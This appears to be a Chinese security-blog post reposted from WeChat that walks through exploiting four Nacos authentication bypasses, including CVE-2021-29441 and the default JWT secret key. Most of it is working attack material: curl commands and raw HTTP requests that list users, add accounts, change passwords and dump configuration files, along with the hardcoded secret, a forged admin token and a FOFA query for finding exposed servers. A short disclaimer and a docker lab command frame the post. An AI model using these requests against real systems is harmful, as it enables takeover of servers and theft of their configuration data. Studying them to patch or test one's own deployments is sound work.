> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/X25_3YNqvH-2W7ds9Y2OrQ)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/DBoCyk48rwCCPPnQaOvNd1EjbbDXb3M2kGVhXicGI9M3pTTzs1PQ5DT6FW1mPbYaEpHUmZSLZ7rSyNnCp3K0huQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1)

**免责声明  
**

**月落星沉研究室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为！！！  
**

Ⅰ Nacos 默认配置未授权访问漏洞

```
http://10.10.84.207:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken
http://your_ip:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9

```

  
Ⅱ Nacos2.2.0 权限绕过  
Header 中添加 serverIdentity: security 能直接绕过身份验证查看用户列表  
如果没有或者不对应则返回 403  
Ⅲ  Nacos1.x.x 版本 User-Agent 权限绕过 ((CVE-2021-29441)  
0x01 漏洞描述  
在 1.4.1 及更早版本的 Nacos 中，当配置为使用身份验证 (Dnacos.core.auth.enabled=true) 时，会使用 AuthFilter servlet 过滤器来强制实施身份验证，从而跳过身份验证检查。此机制依赖于用户代理 HTTP 标头，因此很容易被欺骗。此问题可能允许任何用户在 Nacos 服务器上执行任何管理任务。  
0x02 环境搭建  
docker run -d -p 8848:8848 hglight/cve-2021-29441  
0x03 漏洞影响  
Nacos <= 1.4.1  
0x04 漏洞复现

```
       1.修改User-Agent的值为Nacos-Server到请求包中,
       添加Header头后访问
       http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9
       可以看到返回值为200,且内容中是否包含
       pageItems
GET /nacos/v1/auth/users/?pageNo=1&pageSize=9 HTTP/1.1
Host: 192.168.246.138:8848
User-Agent: Nacos-Server
       或者使用命令访问：
       读取用户密码：
       curl  
'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=' -H 
'User-Agent: Nacos-Server'
curl 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&
search=blur' -H 'User-Agent: Nacos-Server'
curl 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&
search=accurate' -H 'User-Agent: Nacos-Server'
未授权添加用户
curl -X POST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test1&password=test1' -H 'User-Agent:Nacos-Server
任意用户密码更改
curl -X PUT 'http://127.0.0.1:8848/nacos/v1/auth/users?accessToken=' -H 'User-Agent:Nacos-Server' -d 'username=test1&newPassword=test2'
读取配置文件
curl -X GET 'http://127.0.0.1:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99’
curl -X GET 'http://127.0.0.1:8848/nacos/v1/cs/configs?search=blur&dataId=&group=&pageNo=1&pageSize=99’
添加Header头后使用POST方式请求http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub添加一个新用户,账号密码都为vulhub
POST /nacos/v1/auth/users?username=hglight&password=hglight 
HTTP/1.1
Host : 192.168.246.138:8848
User-Agent:Nacos-Server 
或者
POST /nacos/v1/auth/users HTTP/1.1
Host: 192.168.31.64:8848
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Nacos-Server
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
username=hglight&password=hglight
再次查看用户列表，返回的用户列表数据中，多了一个我们通过绕过鉴权创建的新用户
GET /nacos/v1/auth/users/?pageNo=1&pageSize=9 HTTP/1.1
Host: 192.168.246.138:8848
User-Agent: Nacos-Server
访问http://IP:8848/nacos使用新建用户登录，此时表示漏洞利用成功

```

  
Ⅳ  Nacos 默认 key 导致权限绕过登陆  
0x00 漏洞描述  
Nacos 中发现影响 Nacos <= 2.1.0 的问题，Nacos 用户使用默认 JWT 密钥导致未授权访问漏洞。通过该漏洞，攻击者可以绕过用户名密码认证，直接登录 Nacos 用户  
0x01 漏洞影响  
0.1.0 <= Nacos <= 2.2.0  
0x02 漏洞搜索  
fofa：app="NACOS"  
0x03 漏洞复现  
  
在 nacos 中，token.secret.key 值是固定死的，位置在 conf 下的 application.properties 中：  
nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789  
 1. 获取 token  
利用该默认 key 可进行 jwt 构造，直接进入后台，构造方法：  
在 https://jwt.io / 中：输入默认 key：  
SecretKey012345678901234567890123456789012345678901234567890123456789  
  
然后再 payload 里面输入：  
{  
  "sub": "nacos",  
  "exp": 1678899909  
}  
在这里注意：1678899909 这个值是 unix 时间戳，换算一下，要比你系统当前的时间更晚，比如当前的时间是 2023 年 03 月 15 日 22:11:09，在这里面的时间戳时间是 3 月 16 号了：  
复制上面得到的值，在 burp 里面选择登录之后构造：  
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s  
方框里面需要自行添加：  

```
POST /nacos/v1/auth/users/login HTTP/1.1
Host: 10.211.55.5:8848
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://10.211.55.5:8848
Connection: close
Referer: http://10.211.55.5:8848/nacos/index.html
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s
username=crowsec&password=crowsec
此时就得到了token信息：
HTTP/1.1 200 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Content-Security-Policy: script-src 'self'
Set-Cookie: JSESSIONID=D90CF6E5B233685E4A39C1B1BDA9F185; Path=/nacos; HttpOnly
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s
Content-Type: application/json
Date: Wed, 15 Mar 2023 14:13:22 GMT
Connection: close
Content-Length: 197
{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s","tokenTtl":18000,"globalAdmin":true,"username":"nacos"}

```

  
此时就得到了 nacos 的 token 信息。  
2. 利用获取 token 登录后台  
如何登录呢，在这里需要用假账号登录之后，再修改返回包就行了，试试看：  
先用假账号登录，用 burp 拦截：  
这肯定进不去的，在这里修改返回包，右键看下这个：  
然后 Forward，这边返回的信息肯定是无效的：  
在这里使用刚刚 burp 里面生成的返回包进行替换，全部复制过去：  
再 forward 一次：  
此时就已经进去了：  
3. 使用默认密钥生成的 JWT 查看当前用户名和密码  

```
GET /nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s&pageNo=1&pageSize=9 HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0
Accept-Encoding: gzip, deflate
Connection: close
If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT
Upgrade-Insecure-Requests: 1
accessToken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s

```

  
4. 利用默认密钥，添加 hellonacos 用户密码为 hellonacos，创建成功  

```
POST /nacos/v1/auth/users HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 
Authorization: Bearer  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s
Accept-Encoding: gzip, deflate 
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
username=hellonacos&password=hellonacos

```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DBoCyk48rwAaTd6hGhicFwMCY17bwoicmreib58yu2V1x6YMFFtg5U8Xb84qmGFr1gLq9XFt4S9VqvLoI7Wlaoz2w/640?wx_fmt=jpeg)